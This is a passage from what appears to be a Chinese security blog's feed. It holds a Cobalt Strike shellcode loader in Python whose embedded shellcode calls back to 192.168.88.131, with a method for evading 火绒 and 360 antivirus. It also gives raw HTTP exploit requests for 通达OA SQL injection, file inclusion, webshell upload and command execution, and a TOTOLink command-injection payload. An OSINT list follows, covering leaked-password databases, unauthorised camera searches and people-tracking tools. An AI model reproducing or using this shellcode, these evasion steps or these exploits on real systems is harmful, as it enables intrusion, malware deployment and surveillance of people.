b&quot;\x40\x5e\x99\xad\x2f\x96\x03\xa2\x4b\x04\xfc\x17\xc2\x46\x0d\x07\x64\x95\x38\x4d\x3b\x21\x5f\x2a\xb8&quot; \</span><br><span class="line">             b&quot;\x6a\xc2\x94\x50\x35\x2a\x8a\x57\x62\x59\xd2\x71\x7c\x15\xad\x77\x64\x33\x99\x4a\x49\x8a\x23\x6c\x76&quot; \</span><br><span class="line">             b&quot;\xfb\x5c\x5b\xb7\x58\xa7\x78\x8b\xce\x5d\x2e\xd8\xde\x0e\x32\x66\xf9\x47\x7a\x5e\x4d\x84\xb5\xbf\x4a&quot; \</span><br><span class="line">             b&quot;\x7b\x0a\xc5\x09\xc0\x3a\x57\xcf\x54\x09\x64\xf7\x5d\x18\x35\x34\x6d\x2c\xa6\xfe\xd1\x91\xb3\x12\xa3&quot; \</span><br><span class="line">             b&quot;\x57\x8f\xe1\xb6\x0b\x2c\x76\x52\x3e\x3a\x73\x18\x90\xd2\x61\x2d\x6d\x0f\x74\xfa\xbc\xe2\x52\x00\x41&quot; \</span><br><span class="line">             b&quot;\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00&quot; \</span><br><span class="line">             b&quot;\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8&quot; \</span><br><span class="line">             b&quot;\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b&quot; \</span><br><span class="line">             b&quot;\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31&quot; \</span><br><span class="line">             b&quot;\x39\x32\x2e\x31\x36\x38\x2e\x38\x38\x2e\x31\x33\x31\x00\x12\x34\x56\x78 &quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = bytearray(shellcode)</span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span><br><span class="line"></span><br><span class="line"># 放入shellcode</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">ctypes.c_uint64(ptr),</span><br><span class="line">    buf,</span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"># 创建一个线程从shellcode防止位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(0))</span><br><span class="line">)</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><p>直接运行，CS成功上线</p><img src="/blog/2022/05/15/Py%E6%89%93%E5%8C%85&%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/4.png" class title="This is an image"> <h4 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h4><p>将加载shellcode的代码写在py_shellcode中，另写一个test.py来调用py_shellcode.py，然后执行test.py,可过火绒、360</p><img src="/blog/2022/05/15/Py%E6%89%93%E5%8C%85&%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/5.png" class title="This is an image"> <img src="/blog/2022/05/15/Py%E6%89%93%E5%8C%85&%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/6.png" class title="This is an image"> <p>成功过火绒</p><p>执行exe成功上线</p><img src="/blog/2022/05/15/Py%E6%89%93%E5%8C%85&%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/7.png" class title="This is an image"> ]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;py2exe打包&quot;&gt;&lt;a href=&quot;#py2exe打包&quot; class=&quot;headerlink&quot; title=&quot;py2exe打包&quot;&gt;&lt;/a&gt;py2exe打包&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t</summary>
      
    
    
    
    <category term="免杀" scheme="https://lanxin-1.github.io/blog/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>通达OA复现</title>
    <link href="https://lanxin-1.github.io/blog/2022/04/16/%E9%80%9A%E8%BE%BEOA%E5%A4%8D%E7%8E%B0/"/>
    <id>https://lanxin-1.github.io/blog/2022/04/16/%E9%80%9A%E8%BE%BEOA%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-16T13:57:24.000Z</published>
    <updated>2022-08-16T11:41:58.664Z</updated>
    
    <content type="html"><![CDATA[<h2 id="通达OA-v11-9"><a href="#通达OA-v11-9" class="headerlink" title="通达OA v11.9"></a>通达OA v11.9</h2><h3 id="通达OA-v11-9-upsharestatus-后台SQL注⼊漏洞"><a href="#通达OA-v11-9-upsharestatus-后台SQL注⼊漏洞" class="headerlink" title="通达OA v11.9 upsharestatus 后台SQL注⼊漏洞"></a>通达OA v11.9 upsharestatus 后台SQL注⼊漏洞</h3><p><strong>漏洞描述</strong> </p><p>通达OA v11.9 及以下版本中由于某些参数过滤不完善导致后台存在SQL注⼊漏洞。 </p><p><strong>影响版本</strong> </p><p>通达OA &lt;= v11.9 </p><p><strong>漏洞详情</strong> </p><p>漏洞⽂件位置 webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 </span><br><span class="line">Host: </span><br><span class="line">Connection: close </span><br><span class="line">Content-Length: 36 </span><br><span class="line">Cache-Control: max-age=0 </span><br><span class="line">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;89&quot;, &quot;Chromium&quot;;v=&quot;89&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot; </span><br><span class="line">sec-ch-ua-mobile: ?0 </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like </span><br><span class="line">Gecko) Chrome/89.0.4389.114 Safari/537.36 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im </span><br><span class="line">age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 </span><br><span class="line">Sec-Fetch-Site: same-origin </span><br><span class="line">Sec-Fetch-Mode: navigate </span><br><span class="line">Sec-Fetch-User: ?1 </span><br><span class="line">Sec-Fetch-Dest: document </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 </span><br><span class="line">Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; </span><br><span class="line">Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.6779153593736 </span><br><span class="line">68; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_ </span><br><span class="line">OPERATION_TIME=1617242241 </span><br><span class="line">x-forwarded-for: 127.0.0.1 </span><br><span class="line">x-originating-ip: 127.0.0.1 </span><br><span class="line">x-remote-ip: 127.0.0.1 </span><br><span class="line">x-remote-addr: 127.0.0.1 </span><br><span class="line">uid=15&amp;status=1&amp;id=1;select sleep(4) </span><br></pre></td></tr></table></figure><p>注意 uid参数 要为当前⽤户的uid才能完成请求，可以使⽤ burp 遍历查看时间响应 </p><h2 id="通达OA-v11-8"><a href="#通达OA-v11-8" class="headerlink" title="通达OA v11.8"></a>通达OA v11.8</h2><p>通达OA v11.8 getway.php 远程⽂件包含漏洞 </p><p><strong>漏洞描述</strong> </p><p>通达OA v11.8 getway.php 存在⽂件包含漏洞，攻击者通过发送恶意请求包含⽇志⽂件导致任意⽂件写⼊漏洞。 </p><p><strong>影响版本</strong> </p><p>通达OA v11.8 </p><p><strong>漏洞详情</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.发送恶意请求让⽇志被记录 </span><br><span class="line">GET /d1a4278d?json=&#123;&#125;&amp;aa= HTTP/1.1 </span><br><span class="line">Host: </span><br><span class="line">User-Agent: Go-http-client/1.1 </span><br><span class="line">Accept-Encoding: gzip </span><br><span class="line">2.在通过漏洞包含⽇志⽂件 </span><br><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1 </span><br><span class="line">Host: </span><br><span class="line">User-Agent: Go-http-client/1.1 </span><br><span class="line">Content-Length: 54 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Accept-Encoding: gzip </span><br><span class="line">json=&#123;&quot;url&quot;:&quot;/general/../../nginx/logs/oa.access.log&quot;&#125; </span><br><span class="line">3.再次发送恶意请求写⼊⽂件 </span><br><span class="line">POST /mac/gateway.php HTTP/1.1 </span><br><span class="line">Host: </span><br><span class="line">User-Agent: Go-http-client/1.1 </span><br><span class="line">Content-Length: 54 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Accept-Encoding: gzip </span><br><span class="line">json=&#123;&quot;url&quot;:&quot;/general/../../nginx/logs/oa.access.log&quot;&#125; </span><br><span class="line">4.访问写⼊的⽂件 /mac/cmdshell.php </span><br></pre></td></tr></table></figure><h2 id="通达OA-v11-8-api-ali-php-任意⽂件上传漏洞"><a href="#通达OA-v11-8-api-ali-php-任意⽂件上传漏洞" class="headerlink" title="通达OA v11.8 api.ali.php 任意⽂件上传漏洞"></a>通达OA v11.8 api.ali.php 任意⽂件上传漏洞</h2><p><strong>漏洞描述</strong> </p><p>通达OA v11.8 api.ali.php 存在任意⽂件上传漏洞，攻击者通过漏可以上传恶意⽂件控制服务器。 </p><p><strong>影响版本</strong> </p><p>通达OA v11.8 </p><p><strong>漏洞详情</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /mobile/api/api.ali.php HTTP/1.1 </span><br><span class="line">Host: </span><br><span class="line">User-Agent: Go-http-client/1.1 </span><br><span class="line">Content-Length: 422 </span><br><span class="line">Content-Type: multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae </span><br><span class="line">Accept-Encoding: gzip </span><br><span class="line">--502f67681799b07e4de6b503655f5cae </span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fb6790f4.json&quot; </span><br><span class="line">Content-Type: application/octet-stream </span><br><span class="line">&#123;&quot;modular&quot;:&quot;AllVariable&quot;,&quot;a&quot;:&quot;ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/ </span><br><span class="line">cGhwIHBocGluZm8oKTs/PicpOw==&quot;,&quot;dataAnalysis&quot;:&quot;&#123;\&quot;a\&quot;:\&quot;錦&#x27;,$BackData[dataAnalysis] =&gt; </span><br><span class="line">eval(base64_decode($BackData[a])));/*\&quot;&#125;&quot;&#125; </span><br><span class="line">--502f67681799b07e4de6b503655f5cae-- </span><br></pre></td></tr></table></figure><p>参数a base解码 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==fi </span><br><span class="line"></span><br><span class="line">le_put_contents(&#x27;../../fb6790f4.php&#x27;,&#x27;&#x27;); </span><br></pre></td></tr></table></figure><p>再发送GET请求写⼊⽂件 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2109/%3E%3E%3E%3E%3 </span><br><span class="line"></span><br><span class="line">E%3E%3E%3E%3E%3E%3E.fb6790f4 </span><br></pre></td></tr></table></figure><h2 id="通达OA-v11-8-update-php-后台⽂件包含命令执⾏漏洞"><a href="#通达OA-v11-8-update-php-后台⽂件包含命令执⾏漏洞" class="headerlink" title="通达OA v11.8 update.php 后台⽂件包含命令执⾏漏洞"></a>通达OA v11.8 update.php 后台⽂件包含命令执⾏漏洞</h2><p><strong>漏洞描述</strong> </p><p>通达OA v11.8以下存在⽂件上传接⼝，可上传 .user.ini ⽂件包含有PHP语句的⽂件导致命令执⾏。 </p><p><strong>影响版本</strong> </p><p>通达OA &lt; v11.8 </p><p><strong>漏洞详情</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">出现漏洞的⽂件为 webroot/general/hr/manage/staff_info/update.php </span><br><span class="line">由于通达OA 的⽂件上传限制的死死的，所以我们可以通过利⽤ PHP的 .user.ini ⽂件来包含其他⽂件，这⾥ </span><br><span class="line">是可以⽤于包含PHP语句的⽂件的，所以我们上传⽂件内容为 </span><br><span class="line">auto_prepend_file=ttt.log </span><br><span class="line">POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/worksho </span><br><span class="line">p/report/attachment-remark/.user HTTP/1.1 </span><br><span class="line">Host: 192.168.1.105 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/ </span><br><span class="line">81.0 </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------175183239865489 </span><br><span class="line">92951984057104 </span><br><span class="line">Content-Length: 365 </span><br><span class="line">Connection: close </span><br><span class="line">Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4 ; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;ttt.ini&quot; Content-Type: text/plain auto_prepend_file=ttt.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line">提交-----------------------------17518323986548992951984057104-- 其中 USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user 为上传路径 这⾥我们简单知道了上传⽅式，那我们就通过 .user.ini⽂件 包含恶意⽂件 成功上传恶意⽂件 /general/reportshop/workshop/report/attachment-remark/form.inc.php?ttt=ipconfig 在 v11.6中 上传的位置并没有限定所以可以上传在⽅便访问的⽬录(不需要登录) ⽽ v11.8中则有⽬录名的限制需要⽬录带有 webroot 和 attachment</span><br></pre></td></tr></table></figure><p>CVE-2022-25084_TOTOLink程代码执行漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/downloadFlile.cgi?payload=`ls&gt;../mrhrvi.txt`</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;通达OA-v11-9&quot;&gt;&lt;a href=&quot;#通达OA-v11-9&quot; class=&quot;headerlink&quot; title=&quot;通达OA v11.9&quot;&gt;&lt;/a&gt;通达OA v11.9&lt;/h2&gt;&lt;h3 id=&quot;通达OA-v11-9-upsharestatus-后台SQL注⼊漏</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://lanxin-1.github.io/blog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="OA" scheme="https://lanxin-1.github.io/blog/tags/OA/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="https://lanxin-1.github.io/blog/2021/12/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://lanxin-1.github.io/blog/2021/12/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-12-16T06:44:53.000Z</published>
    <updated>2022-08-16T11:42:05.795Z</updated>
    
    <content type="html"><![CDATA[<h3 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h3><h4 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Google</span><br><span class="line">● site:domain.com filetype:xls|doc|pdf</span><br><span class="line">● site:domain.com inurl:admin|login|manage</span><br><span class="line">● site:domain.com intitle:管理|后台|登录</span><br><span class="line">● site:domain.com intext:登录|后台、管理|error|debug</span><br></pre></td></tr></table></figure><h4 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GITHUB资源搜索： </span><br><span class="line">in:name test #仓库标题搜索含有关键字 </span><br><span class="line">in:descripton test #仓库描述搜索含有关键字 </span><br><span class="line">in:readme test #Readme文件搜素含有关键字 </span><br><span class="line">stars:&gt;3000 test #stars数量大于3000的搜索关键字</span><br></pre></td></tr></table></figure><h4 id="有趣的Fofa"><a href="#有趣的Fofa" class="headerlink" title="有趣的Fofa"></a>有趣的Fofa</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#查看看别人家搭建的蜜罐捕获攻击情况，红色的为攻击者，黄色的为蜜罐部署位置，看看哪个国家的肉鸡多~:</span><br><span class="line">body=&quot;img/mhn_logo.png&quot; &amp;&amp; body=&quot;world-map&quot;</span><br><span class="line"># 查询蜜罐资产</span><br><span class="line">is_honeypot=true </span><br><span class="line"># 社工库:</span><br><span class="line">title==&quot;社工库&quot; || ((title=&quot;社工库&quot; &amp;&amp; title=&quot;系统&quot;) ||(title==&quot;社工库查询&quot; ))</span><br><span class="line"># python开启http</span><br><span class="line">server=&quot;SimpleHTTP&quot; &amp;&amp; title=&quot;Directory listing for&quot;</span><br><span class="line"># Jenkins 未授权</span><br><span class="line">port=&quot;8080&quot; &amp;&amp; app=&quot;JENKINS&quot; &amp;&amp; title==&quot;Dashboard [Jenkins]&quot;</span><br><span class="line"># jupyter未授权或者弱口令123456</span><br><span class="line">iconhash:&quot;-895963602&quot; +title:&quot;Home&quot; +country:&quot;CN&quot;</span><br><span class="line">&quot;Jupyter Notebook&quot; &amp;&amp; port=&quot;8888&quot; &amp;&amp; title=&quot;home&quot; &amp;&amp; status_code=&quot;200&quot;</span><br><span class="line"># 可能存在未授权的网络摄像头</span><br><span class="line">app=&quot;webcamXP&quot;</span><br><span class="line">app=&quot;YAWCAM-webcam&quot;</span><br><span class="line">app=&quot;Canon-网络摄像头&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web信息收集"><a href="#web信息收集" class="headerlink" title="web信息收集"></a>web信息收集</h3><p><strong>WhatWeb</strong></p><p>url：<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></p><p>识别网站指纹和一些基础信息</p><p>Wafw00f</p><p>url:<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p><strong>识别网站指纹及防火墙</strong></p><p>云悉指纹：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>识别网站指纹和一些基础信息</p><p>潮汐指纹：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>识别网站指纹及防火墙</p><p><strong>子域名收集</strong></p><p>subfinder</p><p>功能：通过调用各个api接口进行子域名收集（调用包括Sublist3r、crtsh、fofa、spyse等等）<br>需要安装go环境</p><p>url链接： <a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p>OneForAll</p><p>功能：通过DNS、搜索引擎、爬子域等方式进行检索url链接： <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><p><strong>批量信息收集-指纹识别</strong></p><p>EHole(棱洞)： <a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p> 红队重点攻击系统指纹探测工具</p><p><strong>Whois/DNS查询</strong></p><p>url链接：<a href="https://centralops.net/co/DomainDossier.aspx">https://centralops.net/co/DomainDossier.aspx</a><br>功能：查询whois记录、dns记录（站长之家也可以查询,但是有些会被屏蔽，比如百度）</p><p>url链接：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>功能：查询DNS解析记录，其中里面包含其他接口（如：查询共享DNS主机、共享IP主机、端口探测 等端口），但是会超出查询次数</p><p><strong>IP反查域名</strong><br>url链接： <a href="https://rapiddns.io/">https://rapiddns.io/</a><br>功能：查询ip归属地、网络中心，反查网站、旁站C段查询<br>url链接：<a href="https://www.ip138.com/iplookup.asp">https://www.ip138.com/iplookup.asp</a><br>功能：查询同IP下都有哪些web站点</p><p><strong>-数字证书-</strong><br>url链接： <a href="https://search.censys.io/">https://search.censys.io/</a><br>选择证书查询即可，可查询自签名，过期证书、未过期证书、发行人，以及邮箱<br>url链接： <a href="https://crt.sh/">https://crt.sh/</a><br>输入域名即可查询</p><p><strong>搜索引擎/网络空间测绘</strong></p><p>url链接： <a href="https://spyse.com/">https://spyse.com/</a><br>功能：可查ip、域名、CVE、SSL证书等<br>360quake平台<br>url链接： <a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a><br>安恒sumap平台<br>url链接： <a href="https://sumap.dbappsecurity.com.cn/">https://sumap.dbappsecurity.com.cn/</a><br>奇安信鹰图平台<br>url链接： <a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a><br>知道创宇zoomeye平台<br>url链接： <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p><strong>用户昵称收集-sherlock&amp;maigret</strong></p><p>url链接： <a href="https://github.com/sherlock-project/sherlock">https://github.com/sherlock-project/sherlock</a><br>功能：通过社交网络查询（324个站点）用户名<br>url链接：<a href="https://github.com/soxoj/maigret">https://github.com/soxoj/maigret</a><br>功能：通过社交网络查询（500个站点)用户名</p><p>url链接： <a href="https://whatsmyname.app/">https://whatsmyname.app/</a><br>功能：网页版查询用户名存在情况</p><p><strong>社交媒体-rocketreach</strong></p><p>url链接： <a href="https://rocketreach.co/">https://rocketreach.co/</a><br>使用twitter、google账号登陆即可查询</p><p><strong>邮件信息收集-hunter</strong><br>url链接： <a href="https://hunter.io/">https://hunter.io/</a><br>输入需要查询的邮件后缀，即可查看部分，然后再点击来源即可看到详情</p><p>url链接： <a href="https://phonebook.cz/">https://phonebook.cz/</a><br>输入需要查询的邮件后缀，即可查询邮件名(网站中有其他功能但是都不太好用)，该网站的数据是从 <a href="https://intelx.io/%E4%B8%AD%E6%89%BE%E7%9A%84%E6%95%B0%E6%8D%AE">https://intelx.io/中找的数据</a></p><p>url链接： <a href="https://omail.io/">https://omail.io/</a><br>直接查询即可</p><p>url链接： <a href="https://github.com/m4ll0k/infoga">https://github.com/m4ll0k/infoga</a><br>功能：从不同公共来源（搜索引擎、pgp 密钥服 务器和 shodan）收集电子邮件帐户信息（IP、 主机名、国家/地区…）的工具，并使用 haveibeenpwned.com API 检查电子邮件是否 泄露</p><p><strong>临时邮件</strong></p><p>url链接： <a href="http://www.fakemailgenerator.com/">http://www.fakemailgenerator.com/</a><br>功能：生成假造身份后可获得一个邮件地址，该邮件 地址可以收邮件内容</p><p>url链接： <a href="https://m.kuku.lu/">https://m.kuku.lu/</a><br>直接使用，可以首发邮件且无需注册</p><p><strong>商业记录-开源备案/工商信息收集</strong></p><p>工具链接： <a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a> </p><p><strong>商业记录-云盘泄露</strong></p><p>url链接： <a href="https://www.dalipan.com/#/">https://www.dalipan.com/#/</a><br>员工手册、通讯录、配置文档<br>url链接： <a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a><br>员工手册、通讯录、配置文档</p><p><strong>代码信息泄露</strong></p><p>url链接： <a href="https://searchcode.com/">https://searchcode.com/</a><br>通过各大源代码平台查询源代码泄漏的关键信息</p><p><strong>密码信息泄漏-intelx</strong><br>url链接： <a href="https://intelx.io/">https://intelx.io/</a><br>密码信息泄漏-社工库TG</p><p><strong>注册信息泄露-REG007</strong></p><p>url链接： <a href="https://www.reg007.com/">https://www.reg007.com/</a></p><p><strong>密码信息泄漏-暗网信息收集</strong></p><p><strong>设备密码信息泄漏-cirt&amp;default-password</strong></p><p>url链接： <a href="https://default-password.info/#letter-N">https://default-password.info/#letter-N</a><br>url链接： <a href="https://cirt.net/">https://cirt.net/</a><br>url链接： <a href="https://www.routerpasswords.com/">https://www.routerpasswords.com/</a></p><p>-<strong>图片信息定位</strong><br>右键属性即可查看经纬度信息（如 果不关闭的话，备注：微信传输的 文件自动会删除） 国外还有一个工具 <a href="http://www.geocreepy.com/">http://www.geocreepy.com/</a>  （能查ins、twitter等）</p><p>OSINT有一款C/S工具可 以图片定位，对twitter、 facebook等国外软件的 定位</p><p><strong>交通信息收集-<em>汽车</em></strong>*<br><a href="https://licenceplatesearch.com/">https://licenceplatesearch.com/</a> </p><p><a href="https://www.vindecoderz.com/">https://www.vindecoderz.com/</a><br>车牌号需要花40-80美金（效果未知）。 vim码可以免费查</p><p><strong>交通信息收集-轮船</strong></p><p>url链接： <a href="https://www.marinetraffic.com/en">https://www.marinetraffic.com/en</a><br>免费查一部分信息</p><p><strong>交通信息收集-飞机</strong><br>航旅纵横app <a href="https://www.flightradar24.com/">https://www.flightradar24.com/</a></p><p>直接查询即可，包括每一趟航天高度、时速、现在位置</p><p><strong>历史漏洞收集</strong></p><p><a href="http://wy.zone.ci/">http://wy.zone.ci/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;搜索语法&quot;&gt;&lt;a href=&quot;#搜索语法&quot; class=&quot;headerlink&quot; title=&quot;搜索语法&quot;&gt;&lt;/a&gt;搜索语法&lt;/h3&gt;&lt;h4 id=&quot;Google&quot;&gt;&lt;a href=&quot;#Google&quot; class=&quot;headerlink&quot; title=&quot;Googl</summary>
      
    
    
    
    <category term="信息收集" scheme="https://lanxin-1.github.io/blog/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
